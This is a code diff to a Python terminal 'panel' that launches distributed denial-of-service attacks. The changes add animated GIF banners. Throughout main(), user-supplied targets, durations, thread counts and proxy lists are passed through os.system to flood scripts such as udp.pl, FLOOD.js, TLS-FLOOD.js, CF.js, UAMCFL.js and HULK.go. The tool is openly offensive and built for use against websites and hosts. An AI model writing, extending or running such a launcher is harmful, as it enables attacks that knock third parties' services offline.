@@ -15,7 +15,12 @@ from time import sleep
 from datetime import datetime, date
 from colorama import Fore, Back, init
 import pystyle
-from pystyle import *
+from pystyle import Colors, Colorate, Center
+from asciimatics.effects import BannerText, Print, Scroll
+from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
+from asciimatics.scene import Scene
+from asciimatics.screen import Screen
+from asciimatics.exceptions import ResizeScreenError, StopApplication
 import codecs
 
 author = "D4XG"
@@ -86,6 +91,49 @@ def ascii_vro():
     """)
     time.sleep(0.8)
     os.system('cls' if os.name == 'nt' else 'clear')
+
+def attack(screen):
+    scenes = []
+    effects = [
+        Print(screen,
+              ColourImageFile(screen, "ASSETS/attack.gif", screen.height,
+                              uni=screen.unicode_aware),
+              screen.height // -5),
+    ]
+    scenes.append(Scene(effects, 21))
+
+    # Display the first scene
+    screen.play(scenes, stop_on_resize=False, repeat=False)
+
+    # Introduce a delay (adjust the sleep duration as needed)
+    time.sleep(2)
+
+def help(screen):
+    scenes = []
+    effects = [
+        Print(screen,
+              ColourImageFile(screen, "ASSETS/help.gif", screen.height,
+                              uni=screen.unicode_aware),
+              screen.height//- 5,
+              speed=1),
+    ]
+    scenes.append(Scene(effects, 24))
+
+    screen.play(scenes, stop_on_resize=False, repeat=False)
+
+def methods(screen):
+    scenes = []
+    effects = [
+        Print(screen,
+              ColourImageFile(screen, "ASSETS/methods.gif", screen.height,
+                              uni=screen.unicode_aware),
+              screen.height//- 5,
+              speed=1),
+    ]
+    scenes.append(Scene(effects, 24))
+
+    screen.play(scenes, stop_on_resize=False, repeat=False)
+
 def si():
     print('Login...')
     print("")
@@ -109,6 +157,7 @@ class Color:
     colorama.init()
 
 def menu():
+        Screen.wrapper(help)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""
           \x1b[38;5;160m┌──────────────────────────────────────────────────────────┐  
@@ -133,11 +182,12 @@ def menu():
                 ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m tools  \x1b[38;5;160m> Show Tools               ║
                 ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m update \x1b[38;5;160m> Update Script/Panel      ║
                 ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m clear  \x1b[38;5;160m> Clean the terminal       ║
-                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m exit   > Exit the panel           ║
+                ║    \x1b[38;5;160m[\x1b[38;5;255m#\x1b[38;5;160m]\x1b[38;5;255m exit   \x1b[38;5;160m> Exit the panel           ║
                 ╚══════════════════════════════════════════╝
 """)
 
 def layer7():
+        Screen.wrapper(methods)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
                ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
@@ -168,6 +218,7 @@ def layer7():
 
 
 def tools():
+        Screen.wrapper(methods)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
                ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
@@ -194,6 +245,7 @@ def tools():
 \033[0m""")
 
 def layer4():
+        Screen.wrapper(methods)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
                ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
@@ -219,6 +271,7 @@ def layer4():
 \033[0m""")
 
 def vip():
+        Screen.wrapper(methods)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
                ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
@@ -245,6 +298,7 @@ def vip():
 \033[0m""")
 
 def hell():
+        Screen.wrapper(methods)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""               \x1b[38;5;160m╔══════════════════════════════════════════════════════════════════╗
                ║          \x1b[38;5;160m        ::::::;       ;          OOOOO                  ║
@@ -272,6 +326,7 @@ def hell():
 \033[0m""")
 
 def rules():
+    Screen.wrapper(help)
     os.system('cls' if os.name == 'nt' else 'clear')
     print("""\033[36m
                                 \x1b[38;5;160m╔═══════════════╗
@@ -312,6 +367,7 @@ def get_ip_information(query):
     except Exception as e:
         print(f"Error: {e}")
 def main():
+        Screen.wrapper(help)
         os.system('cls' if os.name == 'nt' else 'clear')
         print("""              \x1b[38;5;160m                ....
               \x1b[38;5;160m              ;:::::;
@@ -387,6 +443,7 @@ def main():
                                 ip = sin.split()[1]
                                 port = sin.split()[2]
                                 time = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system ("clear")
                                 os.system(f'cd L4 && perl udp.pl {ip} {port} {time}')  
                         except (ValueError, IndexError):
@@ -399,6 +456,7 @@ def main():
                                 port = sin.split()[2]
                                 thread = sin.split()[3]
                                 time = sin.split()[4]
+                                Screen.wrapper(attack)
                                 os.system ("clear")
                                 os.system(f'cd L4 && python tcp.py {ip} {port} 10000 {thread} {time}')  
                         except (ValueError, IndexError):
@@ -409,6 +467,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system ("clear")
                                 os.system(f'cd VIP && node BOW {url} {time} 10 proxy.txt autorate')  
                         except (ValueError, IndexError):
@@ -420,6 +479,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 threads = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system ("clear")
                                 os.system(f'cd L7 && node ck-browser.js {url} {time} {threads} proxy.txt')  
                         except (ValueError, IndexError):
@@ -431,6 +491,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 mode = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system ("clear")
                                 os.system(f'cd VIP && node FLOOD.js {url} {time} 200 8 proxy.txt {mode}')
                         except (ValueError, IndexError):
@@ -442,6 +503,7 @@ def main():
                                 url = sin.split()[1]
                                 port = sin.split()[2]
                                 time = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L4 && perl home.pl {url} {port} 65500 {time}')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHOME <ip> <port> <time>")
@@ -452,6 +514,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node CURSE.js {url} {time} {rate} 10 socks4.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCURSE <url> <time> <rate>")
@@ -462,6 +525,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 thread = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node SPIKE.js {url} {thread} {time}')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSPIKE <url> <threads> <time>")
@@ -471,6 +535,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node CHAOS.js {url} {time} 250 8 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCHAOS <url> <time>")
@@ -480,6 +545,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node KILLER.js {url} {time} 100 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mKILLER <url> <time>")
@@ -489,6 +555,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 method = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && go run HULK.go -site {url} {method} nil')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHULK <url> <GET/POST>")
@@ -498,6 +565,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node 404.js {url} {time} 80 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255m404 <url> <time>")
@@ -507,6 +575,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node CF.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mCF <url> <time>")
@@ -516,6 +585,7 @@ def main():
                         try:
                                 ip = sin.split()[1]
                                 port = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd AA && python paping.py {ip} {port}')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mPAPING <ip> <port>")
@@ -525,6 +595,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node STRESS.js {url} {time} 250 8 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mHTTP-STRESS <url> <time>")
@@ -535,6 +606,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 requests = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd VIP && node TLS-FLOOD.js {url} {time} {requests} 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mTLS-FLOOD <url> <time> <request per ip>")
@@ -544,6 +616,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd VIP && node HTTP-LOAD.js {url} {time} 64 10 proxy.txt')
                                 os.system ("clear")
                         except (ValueError, IndexError):
@@ -555,6 +628,7 @@ def main():
                                 url = sin.split()[1]
                                 port = sin.split()[2]
                                 time = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L4 && go run STRESS.go {url} {port} 3 2000 {time} {time}')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mSTRESS <url> <port> <time>")
@@ -564,6 +638,7 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
+                                Screen.wrapper(attack)
                                 os.system(f'cd VIP && node UAMCFL.js {url} {time} 64 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mUAMCFL <url> <time>")
@@ -574,6 +649,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd VIP && node ENC.js {url} {time} {rate} 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mENC <url> <time> <rate>")
@@ -584,6 +660,7 @@ def main():
                                 url = sin.split()[1]
                                 time = sin.split()[2]
                                 rate = sin.split()[3]
+                                Screen.wrapper(attack)
                                 os.system(f'cd L7 && node DNK.js {url} {time} {rate} 10 proxy.txt')
                         except (ValueError, IndexError):
                                 print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mDNK <url> <time> <rate>")
